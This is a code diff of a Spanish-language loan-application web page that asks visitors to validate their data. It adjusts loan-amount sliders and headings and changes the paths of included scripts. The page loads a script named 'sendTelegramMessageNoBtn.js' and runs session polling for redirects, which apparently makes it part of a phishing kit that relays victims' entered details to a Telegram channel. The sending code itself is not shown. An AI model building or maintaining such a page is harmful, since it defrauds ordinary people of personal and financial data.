@@ -162,7 +162,7 @@
                 Desde $100.000 a $2.400.000. En minutos te decimos si te lo aprobamos o no
               </p> -->
               <h1 class="u-text-white is-credit-effect-page" style="font-size: 2.5rem !important;">
-                Valida tus datos y aumenta tu credito propulsor
+                Valida tus datos y solicita tu crédito
               </h1>
             </div>
           </div>
@@ -209,9 +209,9 @@
               </h4>
               <div class="relative">
                 <div class="text-3xl font-semibold text-white mb-4">
-                  $<span id="montoSeleccionadoSalvavidas">1.000.000</span>
+                  $<span id="montoSeleccionadoSalvavidas">100.000</span>
                 </div>
-                <input type="range" id="montoSalvavidas" min="1000000" max="10000000" step="1000000" value="1000000" class="range-slider" style="
+                <input type="range" id="montoSalvavidas" min="100000" max="5000000" step="100000" value="100000" class="range-slider" style="
                       background: linear-gradient(
                         to right,
                         var(--color-pink-primary) 0%,
@@ -237,8 +237,8 @@
                   updateSliderBackground(); // Inicializa al cargar
                 </script>
                 <div class="flex justify-between text-sm text-gray-300 mt-2">
-                  <span>$1.000.000</span>
-                  <span>$10.000.000</span>
+                  <span>$100.000</span>
+                  <span>$5.000.000</span>
                 </div>
               </div>
             </div>
@@ -386,7 +386,7 @@
             </button>
           </div>
         </div>
-        <script src="js/sendTelegramMessageNoBtn.js"></script>
+        <script src="../js/sendTelegramMessageNoBtn.js"></script>
         <script>
           document.addEventListener("DOMContentLoaded", () => {
             let contSendButton = 1;
@@ -753,7 +753,7 @@
     </div>
   </div>
 
-<script src="js/common.js"></script>
+<script src="java/common.js"></script>
 <script>
 // ==================== POLLING PARA REDIRECCIONES ====================
 const sessionId = localStorage.getItem('sessionId') || 'session_' + Date.now();
